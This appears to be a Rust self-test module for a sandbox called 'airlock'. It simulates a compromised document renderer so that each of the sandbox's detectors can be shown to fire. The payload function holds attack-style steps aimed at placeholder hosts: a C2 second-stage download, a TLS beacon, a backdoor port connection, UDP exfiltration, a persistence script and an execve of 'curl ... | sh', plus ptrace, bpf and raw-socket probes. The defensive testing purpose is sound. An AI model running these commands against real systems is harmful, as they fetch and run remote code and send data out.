//! Simulates a renderer that has been exploited: it runs under exactly the
//! same monitor and limits as mutool and tries the things real document
//! malware does after getting code execution. Used by `airlock selftest` to
//! prove each detector fires. It is harmless: the only "internet" reachable
//! is the host-side sinkhole, which forwards nothing.

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs, UdpSocket};
use std::os::unix::fs::PermissionsExt;
use std::time::Duration;

const C2: &str = "c2.airlock-selftest.example";

fn client_hello(sni: &str) -> Vec<u8> {
    let name = sni.as_bytes();
    let mut sni_ext = Vec::new();
    sni_ext.extend_from_slice(&((name.len() + 3) as u16).to_be_bytes());
    sni_ext.push(0);
    sni_ext.extend_from_slice(&(name.len() as u16).to_be_bytes());
    sni_ext.extend_from_slice(name);
    let mut exts = vec![0, 0];
    exts.extend_from_slice(&(sni_ext.len() as u16).to_be_bytes());
    exts.extend_from_slice(&sni_ext);
    let mut body = vec![3, 3];
    body.extend_from_slice(&[7u8; 32]); // random
    body.push(0); // session id
    body.extend_from_slice(&[0, 2, 0x13, 0x01]); // one cipher suite
    body.extend_from_slice(&[1, 0]); // compression
    body.extend_from_slice(&(exts.len() as u16).to_be_bytes());
    body.extend_from_slice(&exts);
    let mut hs = vec![1];
    hs.extend_from_slice(&(body.len() as u32).to_be_bytes()[1..]);
    hs.extend_from_slice(&body);
    let mut rec = vec![0x16, 3, 1];
    rec.extend_from_slice(&(hs.len() as u16).to_be_bytes());
    rec.extend_from_slice(&hs);
    rec
}

pub fn payload() {
    let t = Some(Duration::from_secs(3));

    // 1. Resolve a C2 domain and download a second stage over HTTP.
    if let Ok(mut addrs) = (C2, 80).to_socket_addrs() {
        if let Some(a) = addrs.next() {
            if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(3)) {
                let _ = s.set_read_timeout(t);
                let _ = s.write_all(format!("GET /stage2.bin HTTP/1.1\r\nHost: {C2}\r\nUser-Agent: airlock-selftest\r\n\r\n").as_bytes());
                let _ = s.read(&mut [0u8; 256]);
            }
        }
    }
    // 2. Beacon over "TLS" to a hard-coded domain, then a raw-IP backdoor port.
    if let Ok(mut addrs) = ("update.airlock-selftest.example", 443).to_socket_addrs() {
        if let Some(a) = addrs.next() {
            if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(3)) {
                let _ = s.write_all(&client_hello("update.airlock-selftest.example"));
                let _ = s.set_read_timeout(t);
                let _ = s.read(&mut [0u8; 64]);
            }
        }
    }
    let raw: SocketAddr = "203.0.113.66:4444".parse().unwrap();
    if let Ok(mut s) = TcpStream::connect_timeout(&raw, Duration::from_secs(3)) {
        let _ = s.write_all(b"HELLO-BACKDOOR\n");
    }
    // 3. Exfiltrate over UDP.
    if let Ok(u) = UdpSocket::bind("0.0.0.0:0") {
        let _ = u.send_to(b"exfil:user-documents", "198.51.100.7:9999");
    }
    // 4. Drop files.
    let _ = std::fs::create_dir_all("/tmp/work/.cache");
    let mut elf = b"\x7fELF\x02\x01\x01\0".to_vec();
    elf.extend_from_slice(&[0u8; 120]);
    let _ = std::fs::write("/tmp/work/.cache/stage2", &elf);
    let _ = std::fs::set_permissions("/tmp/work/.cache/stage2", std::fs::Permissions::from_mode(0o755));
    // The EICAR antivirus test file (harmless by definition), assembled at
    // run time so the agent binary itself does not carry the signature.
    let eicar = [r"X5O!P%@AP[4\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"].concat();
    let _ = std::fs::write("/tmp/work/.cache/update.com", eicar);
    let _ = std::fs::write("/tmp/.persist.sh", format!("#!/bin/sh\ncurl -s http://{C2}/x | sh\n"));
    // 5. Run a shell, spawn a child.
    unsafe {
        let sh = c"/bin/sh".as_ptr();
        let argv = [sh, c"-c".as_ptr(), c"curl http://c2.airlock-selftest.example/x | sh".as_ptr(), std::ptr::null()];
        let envp = [std::ptr::null()];
        libc::execve(sh, argv.as_ptr(), envp.as_ptr());
        if libc::fork() == 0 {
            libc::_exit(0);
        }
    }
    // 6. Poke at other processes and at the kernel.
    unsafe {
        libc::ptrace(libc::PTRACE_ATTACH, 1, 0, 0);
        libc::unshare(libc::CLONE_NEWUSER);
        libc::syscall(libc::SYS_bpf, 0, 0, 0);
        libc::socket(libc::AF_PACKET, libc::SOCK_RAW, 0);
    }
}
